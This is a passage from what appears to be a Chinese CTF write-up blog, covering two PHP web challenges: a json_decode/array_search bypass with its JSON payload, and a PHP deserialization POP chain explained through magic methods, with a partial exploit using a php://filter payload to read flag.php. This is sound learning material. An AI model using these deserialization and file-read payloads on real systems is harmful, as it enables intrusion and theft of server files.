data-astro-cid-woz2nwfv> 2.5. 小光学AI </a> </li><li data-astro-cid-woz2nwfv> <a href="#2022冬奥会" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2.6. 2022冬奥会 </a> </li><li data-astro-cid-woz2nwfv> <a href="#藏在星空中的诗-2" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2.7. 藏在星空中的诗-2 </a> </li><li data-astro-cid-woz2nwfv> <a href="#隐秘的信息" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2.8. 隐秘的信息 </a> </li><li data-astro-cid-woz2nwfv> <a href="#套中套" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2.9. 套中套 </a> </li><li data-astro-cid-woz2nwfv> <a href="#666" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 2.10. 666 </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#reverse" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3. REVERSE </a> <ol class="toc-sublist border-l border-gray-200 dark:border-gray-600" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#amys-code" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3.1. Amy’s Code </a> </li><li data-astro-cid-woz2nwfv> <a href="#how_decode" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3.2. How_decode </a> </li><li data-astro-cid-woz2nwfv> <a href="#sad-code" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3.3. Sad Code </a> </li><li data-astro-cid-woz2nwfv> <a href="#ruststr" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3.4. Ruststr </a> </li><li data-astro-cid-woz2nwfv> <a href="#getthetable" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3.5. GetTheTable </a> </li><li data-astro-cid-woz2nwfv> <a href="#bobs-code" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 3.6. Bob’s Code </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#mobile" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 4. Mobile </a> <ol class="toc-sublist border-l border-gray-200 dark:border-gray-600" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#mobilea" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 4.1. MobileA </a> </li><li data-astro-cid-woz2nwfv> <a href="#mobileb" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 4.2. MobileB </a> </li><li data-astro-cid-woz2nwfv> <a href="#mobilec" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 4.3. MobileC </a> </li> </ol> </li><li data-astro-cid-woz2nwfv> <a href="#pwn" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 5. PWN </a> <ol class="toc-sublist border-l border-gray-200 dark:border-gray-600" data-astro-cid-woz2nwfv> <li data-astro-cid-woz2nwfv> <a href="#heapheap" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 5.1. heapheap </a> </li><li data-astro-cid-woz2nwfv> <a href="#h-o-s" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 5.2. h-o-s </a> </li><li data-astro-cid-woz2nwfv> <a href="#create_id" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 5.3. create_id </a> </li><li data-astro-cid-woz2nwfv> <a href="#跳一跳" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 5.4. 跳一跳 </a> </li><li data-astro-cid-woz2nwfv> <a href="#untidy_note" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 5.5. untidy_note </a> </li><li data-astro-cid-woz2nwfv> <a href="#sim_treasure" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 5.6. sim_treasure </a> </li><li data-astro-cid-woz2nwfv> <a href="#unlink" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 5.7. unlink </a> </li><li data-astro-cid-woz2nwfv> <a href="#huge_space" class="toc-link text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white hover:bg-gray-100 dark:hover:bg-gray-700 transition-colors duration-300" data-astro-cid-woz2nwfv> 5.8. Huge_Space </a> </li> </ol> </li> </ol> </nav>  <script lang="js">
  function initTableOfContents() {
    const links = document.querySelectorAll('.toc-link');
    const headings = Array.from(links)
      .map(link => {
        const href = link.getAttribute('href');
        if (href && href.startsWith('#')) {
          const id = href.slice(1);
          return document.getElementById(id);
        }
        return null;
      })
      .filter(element => element !== null);

    // 平滑滚动功能
    function scrollToElement(targetId) {
      const target = document.getElementById(targetId);
      if (target) {
        const headerOffset = 100;
        const elementPosition = target.getBoundingClientRect().top;
        const offsetPosition = elementPosition + window.pageYOffset - headerOffset;

        window.scrollTo({
          top: offsetPosition,
          behavior: 'smooth'
        });
      }
    }

    // 设置活跃链接
    function setActiveLink(targetId) {
      links.forEach(link => link.classList.remove('active'));
      
      const activeLink = document.querySelector('.toc-link[href="#' + targetId + '"]');
      if (activeLink) {
        activeLink.classList.add('active');
        
        if (window.location.hash.slice(1) !== targetId) {
          history.replaceState(null, '', '#' + targetId);
        }
      }
    }

    // 设置平滑滚动
    links.forEach(link => {
      link.addEventListener('click', function(e) {
        e.preventDefault();
        const href = link.getAttribute('href');
        if (href && href.startsWith('#')) {
          const targetId = href.slice(1);
          scrollToElement(targetId);
        }
      });
    });

    // 设置交集观察器
    const observer = new IntersectionObserver(
      function(entries) {
        const visibleEntries = entries.filter(entry => entry.isIntersecting);
        if (visibleEntries.length > 0) {
          const visibleEntry = visibleEntries.reduce(function(prev, current) {
            return prev.boundingClientRect.top < current.boundingClientRect.top ? prev : current;
          });
          setActiveLink(visibleEntry.target.id);
        }
      },
      { rootMargin: '-10% 0px -70% 0px' }
    );

    headings.forEach(function(heading) {
      observer.observe(heading);
    });

    // 处理初始哈希
    function handleInitialHash() {
      const hash = window.location.hash;
      if (hash) {
        setTimeout(function() {
          const targetId = hash.slice(1);
          scrollToElement(targetId);
          setActiveLink(targetId);
        }, 300); // 增加延迟时间，确保页面完全加载
      }
    }

    // 处理哈希变化
    function handleHashChange() {
      const hash = window.location.hash;
      if (hash) {
        const targetId = hash.slice(1);
        scrollToElement(targetId);
        setActiveLink(targetId);
      }
    }

    // 确保在不同加载阶段都能正确处理锚点
    handleInitialHash();
    window.addEventListener('popstate', handleInitialHash);
    window.addEventListener('hashchange', handleHashChange);
    
    // 页面完全加载后再次检查
    window.addEventListener('load', function() {
      setTimeout(handleInitialHash, 100);
    });
  }

  // 初始化
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initTableOfContents);
  } else {
    initTableOfContents();
  }
</script>  <div class="lightbox-wrapper" data-astro-cid-vqtgpguw>  <section id="article" class="prose prose-lg max-w-none dark:prose-invert" aria-label="文章正文">   <p>河南提交Writeup时间已过，今天把自己整理的WP发出来，今年和去年相比解出了更多的题，也认识了一些师傅。</p>
<!--more-->
<h2 id="web">WEB</h2>
<h3 id="冬奥会">冬奥会</h3>
<blockquote>
<p>你来参加2022届冬奥会，想知道冬奥会的主办方想告诉你什么吗？</p>
</blockquote>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
<span class="line" data-line="2"></span>
<span class="line" data-line="3"><span style="color:#79B8FF">show_source</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">__FILE__</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="4"></span>
<span class="line" data-line="5"><span style="color:#E1E4E8">$Step1</span><span style="color:#F97583">=</span><span style="color:#79B8FF">False</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="6"><span style="color:#E1E4E8">$Step2</span><span style="color:#F97583">=</span><span style="color:#79B8FF">False</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="7"></span>
<span class="line" data-line="8"><span style="color:#E1E4E8">$info</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">array</span><span style="color:#E1E4E8">)</span><span style="color:#79B8FF">json_decode</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">@</span><span style="color:#E1E4E8">$_GET[</span><span style="color:#9ECBFF">'Information'</span><span style="color:#E1E4E8">]);</span></span>
<span class="line" data-line="9"></span>
<span class="line" data-line="10"><span style="color:#F97583">if</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">is_array</span><span style="color:#E1E4E8">($info)){</span></span>
<span class="line" data-line="11"></span>
<span class="line" data-line="12"><span style="color:#79B8FF">    var_dump</span><span style="color:#E1E4E8">($info);</span></span>
<span class="line" data-line="13"></span>
<span class="line" data-line="14"><span style="color:#79B8FF">    is_numeric</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">@</span><span style="color:#E1E4E8">$info[</span><span style="color:#9ECBFF">"year"</span><span style="color:#E1E4E8">])</span><span style="color:#F97583">?die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Sorry~"</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">:</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="15"><span style="color:#F97583">    if</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">@</span><span style="color:#E1E4E8">$info[</span><span style="color:#9ECBFF">"year"</span><span style="color:#E1E4E8">]){</span></span>
<span class="line" data-line="16"><span style="color:#E1E4E8">        ($info[</span><span style="color:#9ECBFF">"year"</span><span style="color:#E1E4E8">]</span><span style="color:#F97583">=</span><span style="color:#79B8FF">2022</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">?</span><span style="color:#E1E4E8">$Step1</span><span style="color:#F97583">=</span><span style="color:#79B8FF">True</span><span style="color:#F97583">:</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="17"><span style="color:#E1E4E8">    }</span></span>
<span class="line" data-line="18"><span style="color:#F97583">    if</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">is_array</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">@</span><span style="color:#E1E4E8">$info[</span><span style="color:#9ECBFF">"items"</span><span style="color:#E1E4E8">])){</span></span>
<span class="line" data-line="19"><span style="color:#F97583">        if</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">!</span><span style="color:#79B8FF">is_array</span><span style="color:#E1E4E8">($info[</span><span style="color:#9ECBFF">"items"</span><span style="color:#E1E4E8">][</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">])</span><span style="color:#F97583">OR</span><span style="color:#79B8FF"> count</span><span style="color:#E1E4E8">($info[</span><span style="color:#9ECBFF">"items"</span><span style="color:#E1E4E8">])</span><span style="color:#F97583">!==</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8"> ) </span><span style="color:#F97583">die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Sorry~"</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="20"><span style="color:#E1E4E8">        $status </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> array_search</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"skiing"</span><span style="color:#E1E4E8">, $info[</span><span style="color:#9ECBFF">"items"</span><span style="color:#E1E4E8">]);</span></span>
<span class="line" data-line="21"><span style="color:#E1E4E8">        $status</span><span style="color:#F97583">===</span><span style="color:#79B8FF">false</span><span style="color:#F97583">?die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Sorry~"</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">:</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="22"><span style="color:#F97583">        foreach</span><span style="color:#E1E4E8">($info[</span><span style="color:#9ECBFF">"items"</span><span style="color:#E1E4E8">] </span><span style="color:#F97583">as</span><span style="color:#E1E4E8"> $key</span><span style="color:#F97583">=></span><span style="color:#E1E4E8">$val){</span></span>
<span class="line" data-line="23"><span style="color:#E1E4E8">            $val</span><span style="color:#F97583">===</span><span style="color:#9ECBFF">"skiing"</span><span style="color:#F97583">?die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"Sorry~"</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">:</span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="24"><span style="color:#E1E4E8">        }</span></span>
<span class="line" data-line="25"><span style="color:#E1E4E8">        $Step2</span><span style="color:#F97583">=</span><span style="color:#79B8FF">True</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="26"><span style="color:#E1E4E8">    }</span></span>
<span class="line" data-line="27"><span style="color:#E1E4E8">}</span></span>
<span class="line" data-line="28"></span>
<span class="line" data-line="29"><span style="color:#F97583">if</span><span style="color:#E1E4E8">($Step1 </span><span style="color:#F97583">&#x26;&#x26;</span><span style="color:#E1E4E8"> $Step2){</span></span>
<span class="line" data-line="30"><span style="color:#F97583">    include</span><span style="color:#9ECBFF"> "2022flag.php"</span><span style="color:#E1E4E8">;</span><span style="color:#79B8FF">echo</span><span style="color:#E1E4E8"> $flag;</span></span>
<span class="line" data-line="31"><span style="color:#E1E4E8">}</span></span>
<span class="line" data-line="32"><span style="color:#F97583">?></span></span></code></pre>
<p>开头使用 <code>json_decode</code> 要求 <code>year</code> 不能是数字，其次就是数组 <code>count</code> ，也就是长度必须是 <code>3</code>，然后在绕绕 <code>array_search</code> 就行了，简单的一批。</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="json"><code><span class="line" data-line="1"><span style="color:#E1E4E8">{</span><span style="color:#79B8FF">"year"</span><span style="color:#E1E4E8">:</span><span style="color:#9ECBFF">"a"</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">"items"</span><span style="color:#E1E4E8">:[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,[</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">1</span><span style="color:#E1E4E8">],</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">]}</span></span></code></pre>
<h3 id="pop2020">Pop2020</h3>
<blockquote>
<p>大家好，我是pip美，我的朋友pop子出现了一些问题，你们能帮我找到pop子出了什么问题吗？</p>
</blockquote>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
<span class="line" data-line="2"></span>
<span class="line" data-line="3"><span style="color:#79B8FF">echo</span><span style="color:#9ECBFF"> 'Happy New Year~ MAKE A WISH&#x3C;br>'</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="4"></span>
<span class="line" data-line="5"><span style="color:#F97583">if</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">isset</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'wish'</span><span style="color:#E1E4E8">])){</span></span>
<span class="line" data-line="6"><span style="color:#F97583">    @</span><span style="color:#79B8FF">unserialize</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'wish'</span><span style="color:#E1E4E8">]);</span></span>
<span class="line" data-line="7"><span style="color:#E1E4E8">}</span></span>
<span class="line" data-line="8"><span style="color:#F97583">else</span><span style="color:#E1E4E8">{</span></span>
<span class="line" data-line="9"><span style="color:#E1E4E8">    $a</span><span style="color:#F97583">=new</span><span style="color:#79B8FF"> Road_is_Long</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="10"><span style="color:#79B8FF">    highlight_file</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">__FILE__</span><span style="color:#E1E4E8">);</span></span>
<span class="line" data-line="11"><span style="color:#E1E4E8">}</span></span>
<span class="line" data-line="12"><span style="color:#6A737D">/***************************pop your 2022*****************************/</span></span>
<span class="line" data-line="13"></span>
<span class="line" data-line="14"><span style="color:#F97583">class</span><span style="color:#B392F0"> Road_is_Long</span><span style="color:#E1E4E8">{</span></span>
<span class="line" data-line="15"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $page;</span></span>
<span class="line" data-line="16"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $string;</span></span>
<span class="line" data-line="17"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __construct</span><span style="color:#E1E4E8">($file</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'index.php'</span><span style="color:#E1E4E8">){</span></span>
<span class="line" data-line="18"><span style="color:#79B8FF">        $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">page </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> $file;</span></span>
<span class="line" data-line="19"><span style="color:#E1E4E8">    }</span></span>
<span class="line" data-line="20"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __toString</span><span style="color:#E1E4E8">(){</span></span>
<span class="line" data-line="21"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">string</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">page;</span></span>
<span class="line" data-line="22"><span style="color:#E1E4E8">    }</span></span>
<span class="line" data-line="23"></span>
<span class="line" data-line="24"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __wakeup</span><span style="color:#E1E4E8">(){</span></span>
<span class="line" data-line="25"><span style="color:#F97583">        if</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">preg_match</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"/</span><span style="color:#DBEDFF">file|ftp|http|https|gopher|dict|</span><span style="color:#85E89D;font-weight:bold">\.\.</span><span style="color:#9ECBFF">/i"</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">page)) {</span></span>
<span class="line" data-line="26"><span style="color:#79B8FF">            echo</span><span style="color:#9ECBFF"> "You can Not Enter 2022"</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="27"><span style="color:#79B8FF">            $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">page </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "index.php"</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="28"><span style="color:#E1E4E8">        }</span></span>
<span class="line" data-line="29"><span style="color:#E1E4E8">    }</span></span>
<span class="line" data-line="30"><span style="color:#E1E4E8">}</span></span>
<span class="line" data-line="31"></span>
<span class="line" data-line="32"><span style="color:#F97583">class</span><span style="color:#B392F0"> Try_Work_Hard</span><span style="color:#E1E4E8">{</span></span>
<span class="line" data-line="33"><span style="color:#F97583">    protected</span><span style="color:#E1E4E8">  $var;</span></span>
<span class="line" data-line="34"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#B392F0"> append</span><span style="color:#E1E4E8">($value){</span></span>
<span class="line" data-line="35"><span style="color:#F97583">        include</span><span style="color:#E1E4E8">($value);</span></span>
<span class="line" data-line="36"><span style="color:#E1E4E8">    }</span></span>
<span class="line" data-line="37"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __invoke</span><span style="color:#E1E4E8">(){</span></span>
<span class="line" data-line="38"><span style="color:#79B8FF">        $this</span><span style="color:#F97583">-></span><span style="color:#B392F0">append</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">var);</span></span>
<span class="line" data-line="39"><span style="color:#E1E4E8">    }</span></span>
<span class="line" data-line="40"><span style="color:#E1E4E8">}</span></span>
<span class="line" data-line="41"></span>
<span class="line" data-line="42"><span style="color:#F97583">class</span><span style="color:#B392F0"> Make_a_Change</span><span style="color:#E1E4E8">{</span></span>
<span class="line" data-line="43"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $effort;</span></span>
<span class="line" data-line="44"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __construct</span><span style="color:#E1E4E8">(){</span></span>
<span class="line" data-line="45"><span style="color:#79B8FF">        $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">effort </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> array</span><span style="color:#E1E4E8">();</span></span>
<span class="line" data-line="46"><span style="color:#E1E4E8">    }</span></span>
<span class="line" data-line="47"></span>
<span class="line" data-line="48"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __get</span><span style="color:#E1E4E8">($key){</span></span>
<span class="line" data-line="49"><span style="color:#E1E4E8">        $function </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">effort;</span></span>
<span class="line" data-line="50"><span style="color:#F97583">        return</span><span style="color:#E1E4E8"> $function();</span></span>
<span class="line" data-line="51"><span style="color:#E1E4E8">    }</span></span>
<span class="line" data-line="52"><span style="color:#E1E4E8">}</span></span>
<span class="line" data-line="53"><span style="color:#6A737D">/**********************Try to See flag.php*****************************/</span></span></code></pre>
<p>原题 <code>NISACTF2022</code> 的 <a href="https://fjnusec.cn/2022/03/29/NISACTF2022-Official-WP/#POPchain">POPchain</a></p>
<hr>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#B392F0">__construc</span><span style="color:#E1E4E8">()  </span><span style="color:#6A737D"># 当一个对象创建时被调用，</span></span>
<span class="line" data-line="2"><span style="color:#B392F0">__toString</span><span style="color:#E1E4E8">()  </span><span style="color:#6A737D"># 当一个对象被当作一个字符串被调用。</span></span>
<span class="line" data-line="3"><span style="color:#B392F0">__wakeup</span><span style="color:#E1E4E8">()    </span><span style="color:#6A737D"># 使用unserialize时触发</span></span>
<span class="line" data-line="4"><span style="color:#B392F0">__get</span><span style="color:#E1E4E8">()       </span><span style="color:#6A737D"># 用于从不可访问的属性读取数据</span></span>
<span class="line" data-line="5"><span style="color:#6A737D">#难以访问包括：（1）私有属性，（2）没有初始化的属性</span></span>
<span class="line" data-line="6"><span style="color:#B392F0">__invoke</span><span style="color:#E1E4E8">()    </span><span style="color:#6A737D"># 当脚本尝试将对象调用为函数时触发</span></span></code></pre>
<p>题目存在 <code>include</code> 变量，可以尝试控制 <code>$value</code> 通过伪协议读取文件，那也就是是需要触发 <code>_invoke</code></p>
<p>那么，哪里可以将对象调用为函数呢，我们可以看到有</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __get</span><span style="color:#E1E4E8">($key){</span></span>
<span class="line" data-line="2"><span style="color:#E1E4E8">    $function </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">effort;</span></span>
<span class="line" data-line="3"><span style="color:#F97583">    return</span><span style="color:#E1E4E8"> $function();</span></span></code></pre>
<p>这里可以看到通过 <code>_get</code> 方法使得 <code>p</code> 这个对象被调用为 <code>函数</code></p>
<p>可以看到，<code>_get</code> 方法属于 <code>Make_a_Change</code> 类，那么如何调用 <code>Make_a_Change</code> 类呢</p>
<p>从头看，首先 <code>serialize</code> 会触发 <code>__wakeup()</code> ，</p>
<p><code>wakeup()</code> 方法通过 <code>preg_match()</code> 将 <code>$this->page</code> 做字符串比较，如果 <code>$this->page</code> 是 <code>Road_is_Long</code> 类，就调用了 <code>toString()</code> 方法；</p>
<p>又因为如果 <code>$string</code> 的 <code>page</code> 属性难以访问，则会调用 <code>_get</code></p>
<p>如果 <code>$string</code> 是 <code>Test</code> 类，则不存在 <code>page</code> 属性</p>
<p>因此可以有POP链：</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>Try_Work_Hard::__invoke()&#x3C;--Make_a_Change::__get()&#x3C;--Road_is_Long::__toString()</span></span></code></pre>
<hr>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>// 流程</span></span>
<span class="line" data-line="2"><span>Road_is_Long：__wakeup.page</span></span>
<span class="line" data-line="3"><span>$page = new Road_is_Long</span></span>
<span class="line" data-line="4"><span>$string = new Make_a_Change</span></span>
<span class="line" data-line="5"><span>$effort = new Try_Work_Hard</span></span>
<span class="line" data-line="6"><span>$var='php://filter/read=convert.base64-encode/resource=flag.php'; </span></span></code></pre>
<hr>
<p>构造EXP</p>
<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
<span class="line" data-line="2"><span style="color:#F97583">class</span><span style="color:#B392F0"> Try_Work_Hard</span><span style="color:#E1E4E8">{</span></span>
<span class="line" data-line="3"><span style="color:#F97583"> protected</span><span style="color:#E1E4E8">  $var</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'php://filter/read=convert.base64-encode/resource=flag.php'</span><span style="color:#E1E4E8">;</span></span>
<span class="line" data-line="4"><span style="color:#E1E4E8">}</span></span>
<span class="line" data-line="5"><span style="color:#F97583">class</span><span style="color:#B392F0"> Road_is_Long</span><span style="color:#E1E4E8">{</span></span>
<span class="line" data-line="6"><span style="color:#F97583">public</span><span style="color:#E1E4E8"> $page;</span></span>
<span class="line" data-line="7"><span style="color:#E1E4E8"> </span></span>
<span class="line" data-line="8"><span style="color:#F97583">public</span><span style="color:#E1E4E8"> $string;</span></span>
<span class="line" data-line="9"><span style="color:#E1E4E8">}</span></span>
<span class="line" data-line="10"><span style="color:#F97583">class</span><span style="color:#B392F0"> Make_a_Change</span><span style="color:#E1E4E8">{</span></span>
<span class="line" data-line="11"><span style="color:#E1E4E8">    </span></span>
<span class="line" data-line="12"><span style="color:#F97583">public</span><span style="color:#E1E4E8"> $effort;</span></span>
<span class="line" data-line="13"><span style="color:#E1E4E8">}</span></span>
<span class="line" data-line="14"><span style="color:#E1E4E8"> </span></span>
<span class="line" data-line="15"><span style="color:#E1E4E8">$a</span><span style="color:#F97583">=new</span><span style="color:#79B8FF"> Road_is_Long</span><span style="color:#E1E4E8">();</span></span>
